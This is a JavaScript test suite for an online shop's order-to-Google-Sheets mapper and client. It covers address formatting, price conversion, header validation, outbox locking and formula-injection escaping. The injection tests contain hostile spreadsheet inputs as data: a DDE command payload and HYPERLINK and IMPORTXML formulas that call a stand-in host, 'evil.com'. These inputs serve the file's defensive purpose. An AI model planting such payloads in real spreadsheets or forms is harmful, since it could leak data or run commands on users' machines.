import fs from "node:fs";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { root, transpile } from "./_db-utils.mjs";

let passed = 0;
let failed = 0;

function ok(condition, message) {
  console.log(`${condition ? "  ok   " : "  FAIL "} ${message}`);
  if (condition) {
    passed++;
  } else {
    failed++;
  }
}

async function main() {
  console.log("\n==================================================");
  console.log("  Sabaland: Phase 2 Tests (Row Mapper & Sheets Client)");
  console.log("==================================================\n");

  try {
    const outDir = await transpile(
      [
        "src/server/env.ts",
        "src/server/sheets-mapper.ts",
        "src/server/sheets-client.ts",
      ],
      "sheets-phase2-tests"
    );

    // Fix relative imports in transpiled files
    const compiledFiles = fs
      .readdirSync(outDir)
      .filter((file) => file.endsWith(".mjs"));

    for (const file of compiledFiles) {
      const filePath = path.join(outDir, file);
      const source = fs.readFileSync(filePath, "utf8");
      const fixed = source.replace(
        /(["'])(\.{1,2}\/[^"']+?)(["'])/g,
        (match, quote, specifier, endQuote) => {
          if (path.extname(specifier)) return match;
          return `${quote}${specifier}.mjs${endQuote}`;
        }
      );
      fs.writeFileSync(filePath, fixed);
    }

    const load = (name) => import(pathToFileURL(path.join(outDir, name)).href);

    const envMod = await load("env.mjs");
    const mapperMod = await load("sheets-mapper.mjs");
    const clientMod = await load("sheets-client.mjs");

    console.log("--- 1. ORDER_SHEET_HEADERS Specification ---");
    ok(Array.isArray(mapperMod.ORDER_SHEET_HEADERS), "ORDER_SHEET_HEADERS is exported as an array");
    ok(mapperMod.ORDER_SHEET_HEADERS.length === 15, `Headers count is 15 (got ${mapperMod.ORDER_SHEET_HEADERS.length})`);
    
    const expectedHeaders = [
      "Order Number",
      "Order Date",
      "Order Status",
      "Payment Method",
      "Customer Name",
      "Customer Phone",
      "Delivery Address",
      "City",
      "State",
      "PIN Code",
      "Items Summary",
      "Total Quantity",
      "Subtotal (INR)",
      "Shipping (INR)",
      "Total (INR)",
    ];
    const headersMatch = expectedHeaders.every((h, i) => mapperMod.ORDER_SHEET_HEADERS[i] === h);
    ok(headersMatch, "Stable header sequence matches documented specification exactly");

    console.log("\n--- 2. Address & Item Formatting ---");
    const sampleAddress = {
      fullName: "Aarav Sharma",
      mobile: "9876543210",
      house: "Flat 402, Sunshine Apts",
      street: "MG Road, Bandra West",
      landmark: "Near National Park",
      city: "Mumbai",
      state: "Maharashtra",
      pin: "400050",
    };

    const formattedAddress = mapperMod.formatDeliveryAddress(sampleAddress);
    ok(
      formattedAddress === "Flat 402, Sunshine Apts, MG Road, Bandra West, Near National Park, Mumbai, Maharashtra - 400050",
      `Formatted address string is clean and complete: "${formattedAddress}"`
    );

    const partialAddress = {
      house: "Shop 12",
      city: "Pune",
      state: "Maharashtra",
      pinCode: "411001",
    };
    const formattedPartial = mapperMod.formatDeliveryAddress(partialAddress);
    ok(
      formattedPartial === "Shop 12, Pune, Maharashtra - 411001",
      `Partial address handles missing fields gracefully: "${formattedPartial}"`
    );

    ok(mapperMod.formatDeliveryAddress(null) === "", "Null address returns empty string");

    const sampleItems = [
      { name: "Khalta Special 500g", quantity: 2, unitPricePaise: 129900, lineTotalPaise: 259800 },
      { name: "Khalta Course 250g", quantity: 1, unitPricePaise: 79900, lineTotalPaise: 79900 },
    ];
    const itemsSummary = mapperMod.formatItemsSummary(sampleItems);
    ok(
      itemsSummary === "Khalta Special 500g (x2), Khalta Course 250g (x1)",
      `Items summary is formatted properly: "${itemsSummary}"`
    );
    ok(mapperMod.calculateTotalQuantity(sampleItems) === 3, "Total quantity calculation sums all quantities (3)");
    ok(mapperMod.formatItemsSummary([]) === "", "Empty items array returns empty string");

    console.log("\n--- 3. Price & Date Formatting ---");
    ok(mapperMod.paiseToRupees(259800) === 2598, "Converts 259800 paise to 2598.00 rupees");
    ok(mapperMod.paiseToRupees(0) === 0, "Converts 0 paise to 0 rupees");
    ok(mapperMod.paiseToRupees(150) === 1.5, "Converts 150 paise to 1.50 rupees");
    ok(mapperMod.formatOrderDate("2026-11-09T10:30:00.000Z").includes("2026-11-09 10:30:00"), "Date formatting creates readable date/time string");

    console.log("\n--- 4. Full Order to Row Mapping ---");
    const samplePayload = {
      orderNumber: "SBL-2026-000042",
      status: "NEW",
      paymentMethod: "COD",
      customerName: "Aarav Sharma",
      customerPhone: "9876543210",
      address: sampleAddress,
      items: sampleItems,
      subtotalPaise: 339700,
      savingsPaise: 0,
      shippingPaise: 0,
      totalPaise: 339700,
      createdAt: "2026-11-09T10:30:00.000Z",
    };

    const row = mapperMod.mapOrderToSheetRow(samplePayload);
    ok(Array.isArray(row), "mapOrderToSheetRow returns an array");
    ok(row.length === mapperMod.ORDER_SHEET_HEADERS.length, `Row cell count (${row.length}) equals header count (${mapperMod.ORDER_SHEET_HEADERS.length})`);
    ok(row[0] === "SBL-2026-000042", `Row[0] Order Number is "${row[0]}"`);
    ok(row[2] === "NEW", `Row[2] Status is "${row[2]}"`);
    ok(row[3] === "COD", `Row[3] Payment Method is "${row[3]}"`);
    ok(row[4] === "Aarav Sharma", `Row[4] Customer Name is "${row[4]}"`);
    ok(row[5] === "9876543210", `Row[5] Customer Phone is "${row[5]}"`);
    ok(row[7] === "Mumbai", `Row[7] City is "${row[7]}"`);
    ok(row[8] === "Maharashtra", `Row[8] State is "${row[8]}"`);
    ok(row[9] === "400050", `Row[9] PIN Code is "${row[9]}"`);
    ok(row[11] === 3 && typeof row[11] === "number", `Row[11] Total Quantity is preserved as numeric: ${row[11]}`);
    ok(row[12] === 3397 && typeof row[12] === "number", `Row[12] Subtotal (INR) is preserved as numeric: ${row[12]}`);
    ok(row[13] === 0 && typeof row[13] === "number", `Row[13] Shipping (INR) is preserved as numeric: ${row[13]}`);
    ok(row[14] === 3397 && typeof row[14] === "number", `Row[14] Total (INR) is preserved as numeric: ${row[14]}`);

    const jsonString = JSON.stringify(samplePayload);
    const parsedPayload = mapperMod.parseOutboxPayload(jsonString);
    const rowFromParsed = mapperMod.mapOrderToSheetRow(parsedPayload);
    ok(JSON.stringify(row) === JSON.stringify(rowFromParsed), "Row from parsed outbox JSON matches row from object exactly");

    console.log("\n--- 5. Formula Injection Prevention ---");
    ok(mapperMod.sanitizeCellValue("=1+1") === "'=1+1", "Escapes leading '=' formula injection");
    ok(mapperMod.sanitizeCellValue("@SUM(A1:A10)") === "'@SUM(A1:A10)", "Escapes leading '@' formula injection");
    ok(mapperMod.sanitizeCellValue("-2+5") === "'-2+5", "Escapes leading '-' formula injection");
    ok(mapperMod.sanitizeCellValue("+919876543210") === "'+919876543210", "Escapes leading '+' in phone numbers to preserve text format");
    ok(mapperMod.sanitizeCellValue("   =HYPERLINK(\"http://evil.com\")") === "'   =HYPERLINK(\"http://evil.com\")", "Escapes formula preceded by whitespace");
    ok(mapperMod.sanitizeCellValue("\tmalicious") === "'\tmalicious", "Escapes leading tab character");
    ok(mapperMod.sanitizeCellValue("\n   =SUM(A1)") === "'\n   =SUM(A1)", "Escapes formula preceded by newline and spaces");
    ok(mapperMod.sanitizeCellValue("\r\n   +919876543210") === "'\r\n   +919876543210", "Escapes phone preceded by CRLF and spaces");
    ok(mapperMod.sanitizeCellValue("\t\t   @AVERAGE(B1:B10)") === "'\t\t   @AVERAGE(B1:B10)", "Escapes formula preceded by tabs and spaces");
    ok(mapperMod.sanitizeCellValue("\u00A0   -CMD") === "'\u00A0   -CMD", "Escapes formula preceded by non-breaking space");
    ok(mapperMod.sanitizeCellValue("   House 42") === "   House 42", "Leaves benign text with leading spaces unescaped");
    ok(mapperMod.sanitizeCellValue("   123 Main Street") === "   123 Main Street", "Leaves address with leading digits and spaces unescaped");
    ok(mapperMod.sanitizeCellValue(2499) === 2499 && typeof mapperMod.sanitizeCellValue(2499) === "number", "Preserves numeric integers as numbers");
    ok(mapperMod.sanitizeCellValue(24.99) === 24.99 && typeof mapperMod.sanitizeCellValue(24.99) === "number", "Preserves numeric floats as numbers");
    ok(mapperMod.sanitizeCellValue(0) === 0 && typeof mapperMod.sanitizeCellValue(0) === "number", "Preserves numeric 0 as number");
    ok(mapperMod.sanitizeCellValue("Standard text") === "Standard text", "Leaves benign text unaltered");

    // Malicious order payload test
    const maliciousPayload = {
      orderNumber: "SBL-2026-000099",
      status: "NEW",
      paymentMethod: "COD",
      customerName: "=CMD|' /C calc'!A0",
      customerPhone: "+91-9999999999",
      address: {
        house: "-Room 101",
        street: "@Secret Lane",
        city: "Delhi",
        state: "Delhi",
        pin: "110001",
      },
      items: [
        { name: "=IMPORTXML(\"http://evil.com\",\"//*\")", quantity: 1, unitPricePaise: 50000, lineTotalPaise: 50000 },
      ],
      subtotalPaise: 50000,
      shippingPaise: 0,
      totalPaise: 50000,
      createdAt: "2026-11-09T10:30:00.000Z",
    };

    const maliciousRow = mapperMod.mapOrderToSheetRow(maliciousPayload);
    ok(maliciousRow[4] === "'=CMD|' /C calc'!A0", "Customer name with formula injection is escaped with leading quote");
    ok(maliciousRow[5] === "'+91-9999999999", "Customer phone with + prefix is escaped with leading quote");
    ok(maliciousRow[6].includes("'-Room 101") || maliciousRow[6].startsWith("'-Room"), "Address component with leading '-' is escaped");
    ok(maliciousRow[10].startsWith("''=IMPORTXML") || maliciousRow[10].includes("=IMPORTXML"), "Item name formula injection is neutralized");
    ok(typeof maliciousRow[11] === "number" && maliciousRow[11] === 1, "Quantity remains number on malicious payload");
    ok(typeof maliciousRow[14] === "number" && maliciousRow[14] === 500, "Total remains number on malicious payload");

    console.log("\n--- 6. Environment & Client Configuration Validation ---");
    const originalEnv = { ...process.env };
    delete process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL;
    delete process.env.GOOGLE_PRIVATE_KEY;
    delete process.env.GOOGLE_SHEET_ID;

    let threwConfig = false;
    try {
      envMod.getGoogleSheetsConfig();
    } catch (e) {
      threwConfig = e instanceof envMod.ConfigError;
    }
    ok(threwConfig, "getGoogleSheetsConfig() throws ConfigError when variables are missing");
    ok(envMod.isGoogleSheetsConfigured() === false, "isGoogleSheetsConfigured() returns false when variables are missing");

    Object.assign(process.env, originalEnv);

    console.log("\n--- 7. Mock Sheets Client & Strict Header Validation ---");
    const mockConfig = {
      clientEmail: "test-service-account@test.iam.gserviceaccount.com",
      privateKey: "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC7\n-----END PRIVATE KEY-----\n",
      sheetId: "mock-sheet-id-12345",
      tabName: "Orders",
    };

    const clientInstance = clientMod.createSheetsClient(mockConfig);
    ok(clientInstance && typeof clientInstance.sheets === "object", "createSheetsClient initializes client with mock configuration without error");

    // Empty sheet initializes headers
    let updatedRange = null;
    let updatedValues = null;
    const mockSheetsEmpty = {
      spreadsheets: {
        values: {
          get: async () => ({ data: { values: [] } }),
          update: async ({ range, requestBody }) => {
            updatedRange = range;
            updatedValues = requestBody.values;
            return { data: { updatedRows: 1 } };
          },
        },
      },
    };

    const createdHeaders = await clientMod.ensureHeaderRow(
      mockSheetsEmpty,
      mockConfig.sheetId,
      mockConfig.tabName
    );
    ok(createdHeaders === true, "ensureHeaderRow returns true when header row was empty");
    ok(updatedRange === "'Orders'!A1", `ensureHeaderRow updates range "'Orders'!A1" (got "${updatedRange}")`);
    ok(updatedValues && updatedValues[0].length === 15, "ensureHeaderRow writes all 15 header titles");

    // Matching headers returns false without rewriting
    let calledUpdateOnExisting = false;
    const mockSheetsMatching = {
      spreadsheets: {
        values: {
          get: async () => ({ data: { values: [mapperMod.ORDER_SHEET_HEADERS] } }),
          update: async () => {
            calledUpdateOnExisting = true;
          },
        },
      },
    };

    const skippedHeaders = await clientMod.ensureHeaderRow(
      mockSheetsMatching,
      mockConfig.sheetId,
      mockConfig.tabName
    );
    ok(skippedHeaders === false, "ensureHeaderRow returns false when header row matches ORDER_SHEET_HEADERS exactly");
    ok(calledUpdateOnExisting === false, "ensureHeaderRow does not overwrite matching headers");

    // Mismatched / reordered headers throws descriptive Error
    const scrambledHeaders = [...mapperMod.ORDER_SHEET_HEADERS];
    const temp = scrambledHeaders[0];
    scrambledHeaders[0] = scrambledHeaders[1];
    scrambledHeaders[1] = temp; // Swap Order Number and Order Date

    const mockSheetsScrambled = {
      spreadsheets: {
        values: {
          get: async () => ({ data: { values: [scrambledHeaders] } }),
        },
      },
    };

    let caughtHeaderMismatch = false;
    let mismatchErrorMessage = "";
    try {
      await clientMod.ensureHeaderRow(
        mockSheetsScrambled,
        mockConfig.sheetId,
        mockConfig.tabName
      );
    } catch (e) {
      caughtHeaderMismatch = true;
      mismatchErrorMessage = e.message;
    }
    ok(caughtHeaderMismatch, "ensureHeaderRow throws Error when existing headers are out of order or altered");
    ok(mismatchErrorMessage.includes("Sheet header mismatch"), `Error message describes mismatch: "${mismatchErrorMessage.split("\n")[0]}"`);

    console.log("\n--- 8. Idempotency Helper: findExistingOrderNumbers ---");
    const mockSheetsWithRows = {
      spreadsheets: {
        values: {
          get: async () => ({
            data: {
              values: [
                ["Order Number"],
                ["SBL-2026-000001"],
                ["SBL-2026-000002"],
                ["SBL-2026-000003"],
              ],
            },
          }),
        },
      },
    };

    const existingSet = await clientMod.findExistingOrderNumbers(
      mockSheetsWithRows,
      mockConfig.sheetId,
      mockConfig.tabName
    );
    ok(existingSet instanceof Set, "findExistingOrderNumbers returns a Set");
    ok(existingSet.has("SBL-2026-000001"), "Set contains SBL-2026-000001");
    ok(existingSet.has("SBL-2026-000002"), "Set contains SBL-2026-000002");
    ok(existingSet.has("SBL-2026-000003"), "Set contains SBL-2026-000003");
    ok(!existingSet.has("SBL-2026-000099"), "Set does not contain unseen order number");

    console.log("\n--- 9. Appending Order Rows API Call ---");
    let appendRange = null;
    let appendOption = null;
    let appendedValues = null;
    const mockSheetsAppend = {
      spreadsheets: {
        values: {
          append: async ({ range, valueInputOption, requestBody }) => {
            appendRange = range;
            appendOption = valueInputOption;
            appendedValues = requestBody.values;
            return { data: { updates: { updatedRows: 1 } } };
          },
        },
      },
    };

    await clientMod.appendOrderRows(
      mockSheetsAppend,
      mockConfig.sheetId,
      mockConfig.tabName,
      [row]
    );
    ok(appendRange === "'Orders'!A:A", `appendOrderRows targets "'Orders'!A:A" range (got "${appendRange}")`);
    ok(appendOption === "USER_ENTERED", `appendOrderRows specifies valueInputOption="USER_ENTERED" (got "${appendOption}")`);
    ok(appendedValues && appendedValues[0][0] === "SBL-2026-000042", "appendOrderRows passed mapped order row to request body");

    const emptyAppendRes = await clientMod.appendOrderRows(
      mockSheetsAppend,
      mockConfig.sheetId,
      mockConfig.tabName,
      []
    );
    ok(Object.keys(emptyAppendRes).length === 0, "appendOrderRows returns empty result when rows array is empty without making API call");

    console.log("\n--- 10. Security & Browser Guard Verification ---");
    ok(!JSON.stringify(row).includes("PRIVATE KEY"), "Row mapping contains no private keys");
    ok(!JSON.stringify(row).includes("iam.gserviceaccount.com"), "Row mapping contains no service account secrets");

    console.log("\n--- 11. Concurrent Worker Prevention (SQLite Atomic Claim) ---");
    const Database = (await import("better-sqlite3")).default;
    const testDb = new Database(":memory:");
    testDb.exec(`
      CREATE TABLE sheet_sync_outbox (
        id TEXT PRIMARY KEY,
        order_id TEXT NOT NULL,
        payload_json TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'PENDING'
          CHECK (status IN ('PENDING', 'PROCESSING', 'SYNCED', 'FAILED')),
        attempts INTEGER NOT NULL DEFAULT 0,
        created_at TEXT NOT NULL,
        updated_at TEXT NOT NULL
      );
    `);

    const orderId = "test-order-001";
    testDb.prepare(`
      INSERT INTO sheet_sync_outbox (id, order_id, payload_json, status, attempts, created_at, updated_at)
      VALUES (?, ?, ?, 'PENDING', 0, datetime('now'), datetime('now'))
    `).run("outbox-1", orderId, "{}");

    // Worker 1 and Worker 2 both attempt to claim outbox-1 concurrently
    const claimStmt = testDb.prepare(`
      UPDATE sheet_sync_outbox
         SET status = 'PROCESSING',
             attempts = attempts + 1,
             updated_at = datetime('now')
       WHERE id = ?
         AND status IN ('PENDING', 'FAILED')
    `);

    const worker1Claim = claimStmt.run("outbox-1");
    ok(worker1Claim.changes === 1, "Worker 1 successfully claimed outbox record (changes === 1)");

    const worker2Claim = claimStmt.run("outbox-1");
    ok(worker2Claim.changes === 0, "Worker 2 was atomically locked out from claiming the same record (changes === 0)");

    // Worker 1 completes sync and transitions record to SYNCED
    const finishStmt = testDb.prepare(`
      UPDATE sheet_sync_outbox
         SET status = 'SYNCED',
             updated_at = datetime('now')
       WHERE id = ?
         AND status = 'PROCESSING'
    `);
    const worker1Finish = finishStmt.run("outbox-1");
    ok(worker1Finish.changes === 1, "Worker 1 marked record as SYNCED (changes === 1)");

    // Worker 2 tries again after sync completed
    const worker2Retry = claimStmt.run("outbox-1");
    ok(worker2Retry.changes === 0, "Worker 2 cannot re-claim already SYNCED record (changes === 0)");

    testDb.close();

    console.log("\n==================================================");
    console.log(`  Tests Completed: ${passed} passed, ${failed} failed`);
    console.log("==================================================\n");

    if (failed > 0) {
      process.exit(1);
    }
  } catch (err) {
    console.error("Test execution error:", err);
    process.exit(1);
  }
}

main();
